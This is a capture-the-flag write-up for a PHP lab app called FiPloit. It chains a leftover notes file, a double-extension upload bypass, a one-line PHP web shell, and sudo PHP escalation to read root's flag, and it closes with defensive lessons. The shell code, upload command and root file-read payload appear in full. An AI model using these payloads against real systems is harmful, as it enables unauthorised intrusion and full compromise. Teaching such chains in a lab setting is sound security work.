This writeup covers the complete attack chain for FiPloit — a PHP web application with insufficient file upload controls. The chain goes from developer notes discovery → hidden upload endpoint → double extension bypass → web shell RCE → sudo PHP privilege escalation to root.

🔍 Reconnaissance

Started with basic service enumeration on the target. The application was running on port 8080.

curl -I "http://TARGET:8080/index.php"

Response headers revealed X-Powered-By: PHP/8.3.24 — no WAF detected. The visible pages were only index.php, about.php, and contact.php.

📂 Directory & File Enumeration

Used Gobuster with a large wordlist and response-length filtering to remove false positives. The application was returning consistent fake responses (length 2664, 541–547) for non-existent paths, so these were excluded.

gobuster dir -u http://TARGET:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -x php,txt,bak,old \
  --exclude-length 2664,541,542,543,544,545,546,547 \
  -t 20

This surfaced header.php and footer.php but nothing critical yet.

📝 Developer Notes Discovery

After switching focus to exposed text files — a common developer mistake — a plain notes.txt file was found in the web root:

curl http://TARGET:8080/notes.txt

The file contained developer notes including a reference to a hidden PHP endpoint that was not yet removed before deployment. This is a classic example of sensitive information left in a publicly accessible file.

⚠️ Important: Flag values and exact credential content are omitted per writeup guidelines.

📤 Hidden Upload Endpoint

The endpoint discovered via notes.txt was a log file upload page. It presented a form accepting only .txt files — enforced client-side and by extension check only.

curl -s "http://TARGET:8080/[hidden-endpoint].php"

The upload form label confirmed: "Select .txt file". A standard PHP shell upload was rejected.

💣 Double Extension Bypass

The server was filtering only by the first extension check. By using a double extension filename (.txt.php), the filter saw .txt and allowed the upload — but PHP executed it as .php because that is the final extension.

echo '<?php system($_GET["cmd"]); ?>' > shell.txt.php

curl -s -X POST "http://TARGET:8080/[hidden-endpoint].php" \
  -F "file=@shell.txt.php"

Server responded with a success message. The file was saved under the /uploads/ directory.

🐚 Remote Code Execution

Direct access to the uploaded shell confirmed PHP execution:

curl "http://TARGET:8080/uploads/shell.txt.php?cmd=id"
# Output: uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)

From here, the user flag was retrieved from the home directory of the ctf user (content omitted).

⚙️ Privilege Escalation – sudo PHP

Checked sudo permissions for the current user:

sudo -l

Output showed the ctf user could run /usr/bin/php as root with no password required. This is a classic GTFOBins misconfiguration.

curl -G "http://TARGET:8080/uploads/shell.txt.php" \
  --data-urlencode "cmd=sudo php -r 'echo file_get_contents(\"/root/flag-root.txt\");'"

This executed PHP as root, directly reading the root flag. Full system compromise achieved.

🧠 Key Takeaways:

• Never leave developer notes, backup files, or .txt files in the web root — they expose internal structure.
• File upload filters must validate MIME type and content, not just extension — double extensions bypass naive checks.
• NOPASSWD sudo entries for interpreters like php, python, or perl grant instant root — always audit sudo rules.
• Uploaded files should never be stored in a web-accessible directory if execution is possible.
• Response length filtering is essential during enumeration to remove application-level false positives.

🛠️ Tools Used

  • Gobuster – directory and file enumeration
  • curl – manual HTTP requests and file upload
  • FFUF – parameter fuzzing
  • Nikto – web server scanning
  • SecLists – wordlists (raft-large-files, burp-parameter-names)
  • Linux command line – shell interaction and privilege escalation

FiPloit is a great lab for understanding how small developer mistakes — a leftover notes file, a weak upload filter, and an overpermissive sudo rule — chain together into full system compromise.
